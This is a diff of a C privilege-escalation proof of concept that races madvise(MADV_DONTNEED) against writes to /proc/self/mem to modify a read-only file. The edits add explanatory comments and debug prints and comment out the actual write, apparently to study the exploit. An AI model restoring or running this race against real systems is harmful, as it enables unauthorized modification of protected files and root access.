@@ -32,8 +32,8 @@ char *name;
  
 void *madviseThread(void *arg)
 {
-  char *str;
-  str=(char*)arg;
+ // char *str;
+ // str=(char*)arg;//how to use str = foo
   int i,c=0;
   for(i=0;i<100000000;i++)
   {
@@ -42,7 +42,25 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 > This is achieved by racing the madvise(MADV_DONTNEED) system call
 > while having the page of the executable mmapped in memory.
 */
+
+/*
+The madvise() system call is used to give advice or directions to the
+    kernel about the address range beginning at address addr and with
+    size length bytes.
+*/
+
+/*madvice --MADV_DONTNEED
+ Do not expect access in the near future.  (For the time being,
+ > the application is finished with the given range, so the
+ > kernel can free resources associated with it.)
+*/
+
     c+=madvise(map,100,MADV_DONTNEED);
+    //if(i == 0)printf("madviseThread:i =%d, map = %zx, c = %d\n", i, (uintptr_t)map, c);
+    //if(i == 1)printf("madviseThread:i =%d, map = %zx, c = %d\n", i, (uintptr_t)map, c);
+    //if(i == 10)printf("madviseThread:i =%d, map = %zx, c = %d\n", i, (uintptr_t)map, c);
+    if(i == 100)printf("madviseThread:i =%d, map = %zx, c = %d\n", i, (uintptr_t)map, c);
+  
   }
   printf("madvise %d\n\n",c);
 }
@@ -63,9 +81,14 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
   for(i=0;i<100000000;i++) {
 /*
 You have to reset the file pointer to the memory position.
-*/
-    lseek(f,(uintptr_t) map,SEEK_SET);
-    c+=write(f,str,strlen(str));
+*/ 
+    lseek(f,(uintptr_t) map,SEEK_SET);//lseek offset = map
+   // if(i==0) printf("procselfmem: i=%d, map = %zx\n",i, (uintptr_t)map);
+   // if(i==1) printf("procselfmem: i=%d, map = %zx\n",i, (uintptr_t)map);
+   // if(i==10) printf("procselfmem: i=%d, map = %zx\n",i, (uintptr_t)map);
+   // if(i==100) printf("procselfmem: i= %d, map = %zx\n",i, (uintptr_t)map);
+    if(i==1000000000) printf("procselfmem: i=%d, map = %zx\n",i, (uintptr_t)map);
+   // c+=write(f,str,strlen(str));//write m00000000000000000 to /proc/self/mem
   }
   printf("procselfmem %d\n\n", c);
 }
@@ -84,7 +107,7 @@ You have to pass two arguments. File and Contents.
 /*
 You have to open the file in read only mode.
 */
-  f=open(argv[1],O_RDONLY);
+  f=open(argv[1],O_RDONLY);//open foo
   fstat(f,&st);
   name=argv[1];
 /*
